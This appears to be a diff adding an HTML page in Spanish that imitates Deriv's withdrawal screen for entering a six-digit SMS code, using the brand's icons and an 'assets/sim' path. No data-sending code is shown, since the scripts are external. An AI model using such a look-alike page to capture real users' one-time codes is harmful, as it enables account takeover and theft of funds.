@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="es" class="wd-page">
+<head>
+<meta charset="UTF-8">
+<base href="/">
+<link rel="icon" type="image/png" sizes="48x48" href="deriv-d-48.png">
+<link rel="icon" type="image/png" sizes="32x32" href="deriv-d-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="deriv-d-16.png">
+<link rel="apple-touch-icon" href="deriv-d-180.png">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Withdraw | Deriv</title>
+<link rel="stylesheet" href="assets/sim/css/deriv-icons.css?v=20261017zr">
+<link rel="stylesheet" href="assets/sim/css/deriv-withdraw.css?v=20261017zr">
+</head>
+<body class="wd-body" data-scene="/dashboard/withdraw/verify">
+<script src="assets/sim/js/sim-shared.js?v=20261017zr"></script>
+<div class="wd-col">
+  <div class="wd-top">
+    <button class="wd-iconbtn" id="wdBack" aria-label="Volver"><i class="ic ic-pr_back"></i></button>
+    <div class="wd-top-right"><button class="wd-iconbtn" aria-label="Ayuda"><svg class="wd-help" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.3"><circle cx="9" cy="9" r="7.5"/><path d="M6.9 7.1a2.2 2.2 0 1 1 3.2 2c-.7.4-1.1.8-1.1 1.6" stroke-linecap="round"/><circle cx="9" cy="12.9" r=".5" fill="currentColor"/></svg></button><button class="wd-iconbtn" aria-label="Ask Amy"><i class="ic ic-amy"></i></button></div>
+  </div>
+  <h1 class="wd-title">Revisa tu teléfono</h1>
+  <p class="wd-sub">Ingrese el código de 6 digitos enviado por mensaje de texto al <b id="wdPhone"></b></p>
+  <div class="wd-otp" id="wdOtp">
+    <input inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Dígito 1"><input inputmode="numeric" maxlength="1" aria-label="Dígito 2"><input inputmode="numeric" maxlength="1" aria-label="Dígito 3"><input inputmode="numeric" maxlength="1" aria-label="Dígito 4"><input inputmode="numeric" maxlength="1" aria-label="Dígito 5"><input inputmode="numeric" maxlength="1" aria-label="Dígito 6">
+    <span class="wd-otp-spin"></span>
+  </div>
+  <div class="wd-resend" id="wdResend">¿No recibiste el código? Revisa tu SMS o <button type="button" id="wdResendBtn">reenvía el código</button>.</div>
+  <div class="wd-or"><span>o</span></div>
+  <button class="wd-outline" id="wdEmail" type="button">Probar otro método de verificación</button>
+  <div class="wd-msg" id="wdMsg"></div>
+</div>
+<div class="wd-loader" id="wdLoader"><div class="wd-ring"><img src="deriv-d-48.png" alt=""></div></div>
+<script src="assets/sim/js/withdraw.js?v=20261017zr"></script>
+</body>
+</html>
